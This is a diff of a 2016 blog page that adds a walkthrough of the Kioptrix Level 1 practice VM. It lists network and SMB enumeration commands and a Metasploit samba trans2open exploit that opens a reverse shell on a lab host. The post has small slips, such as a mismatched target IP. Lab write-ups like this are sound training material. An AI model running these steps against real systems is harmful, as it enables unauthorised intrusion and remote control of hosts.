@@ -5,11 +5,15 @@
 	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
 	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
 	<meta charset="utf-8">
-	<title>Category: vulhub  | Bob1Bob2</title>
+	<title>vulhub-Kioptrix level 1  | Bob1Bob2</title>
 
 <meta name="author" content="Bob1Bob2"> 
 
-<meta name="description" content="Category: vulhub"> <meta name="keywords" content="">
+<meta name="description" content="From Vulhub Tools: netdiscover
+Nmap
+nbtscab
+enum4linux
+Metasploit Use netdiscover to detect target IP address netdiscover -i eth0 -r 192.168.79.0/24 &hellip;"> <meta name="keywords" content="">
 
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -96,19 +100,92 @@ $(document).ready(
 
 </header>
 
-	<div id="content" class="inner">
-	
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">vulhub-Kioptrix Level 1</h2>
+	<div class="entry-content"><p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>nbtscab</li>
+<li>enum4linux</li>
+<li>Metasploit</li>
+</ul>
 
 
-	
-	
-	<section class="archives"><h1 class="year">2016</h1>
+<!--more-->
 
-<article>
-	<h2 class="title"><a href="/blog/2016/06/06/vulhub-kioptrix-level-1/">vulhub-Kioptrix level 1</a></h2>
-	<div class="meta">
-		<div class="date">Jun  6</div>
-		
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.182 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>
+
+<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>SMB Attack:</p>
+
+<p>Looks like SMB service is on. Lets start nbtscan to exam SMB.</p>
+
+<p><code>nbtscan 192.168.79.182</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use enum4linux to enumerate smb:</p>
+
+<p><code>enum4linux  -a 192.168.79.182</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the samba version</p>
+
+<p>Now start Metasploit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msfconsole
+</span><span class='line'>use exploit/linux/samba/trans2open
+</span><span class='line'>set rhost 192.168.79.182
+</span><span class='line'>set payload generic/shell_reverse_tcp
+</span><span class='line'>exploit
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE SMB</p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-06-06T09:21:18-05:00" pubdate data-updated="true">2016-06-06 09:21:18 -0500</time></div>
+	
 
 <div class="tags">
 
@@ -117,129 +194,21 @@ $(document).ready(
 </div>
 
 
-	    
-	</div>
-</article>
-
 	
+</div></article>
 
-
-<article>
-	<h2 class="title"><a href="/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a></h2>
-	<div class="meta">
-		<div class="date">May 31</div>
-		
-
-<div class="tags">
-
-	<a class='category' href='/blog/categories/vulhub/'>vulhub</a>
-
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
 </div>
 
-
-	    
-	</div>
-</article>
-
-	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2016/05/18/sickos-1-dot-1/">sickos:1.1</a></h2>
-	<div class="meta">
-		<div class="date">May 18</div>
-		
-
-<div class="tags">
-
-	<a class='category' href='/blog/categories/squid/'>squid</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
-
-</div>
-
-
-	    
-	</div>
-</article>
-
-	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2016/05/05/csharp-vulnjson/">Csharp: VulnJson</a></h2>
-	<div class="meta">
-		<div class="date">May  5</div>
-		
-
-<div class="tags">
-
-	<a class='category' href='/blog/categories/vulhub/'>vulhub</a>
-
-</div>
-
-
-	    
-	</div>
-</article>
-
-	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2016/05/02/vulhub-kevgir1/">vulhub:kevgir1</a></h2>
-	<div class="meta">
-		<div class="date">May  2</div>
-		
-
-<div class="tags">
-
-	<a class='category' href='/blog/categories/vulhub/'>vulhub</a>
-
-</div>
-
-
-	    
-	</div>
-</article>
-
-	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2016/04/26/sectalks-bne0x00-minotaur/">SecTalks: BNE0x00 - Minotaur</a></h2>
-	<div class="meta">
-		<div class="date">Apr 26</div>
-		
-
-<div class="tags">
-
-	<a class='category' href='/blog/categories/vulhub/'>vulhub</a>
-
-</div>
-
-
-	    
-	</div>
-</article>
-
-	
-
-
-<article>
-	<h2 class="title"><a href="/blog/2016/04/20/sectalks-bne0x03-simple/">SecTalks: BNE0x03 - Simple</a></h2>
-	<div class="meta">
-		<div class="date">Apr 20</div>
-		
-
-<div class="tags">
-
-	<a class='category' href='/blog/categories/vulhub/'>vulhub</a>
-
-</div>
-
-
-	    
-	</div>
-</article>
 
 </div>
 	<footer id="footer" class="inner">Copyright &copy; 2016
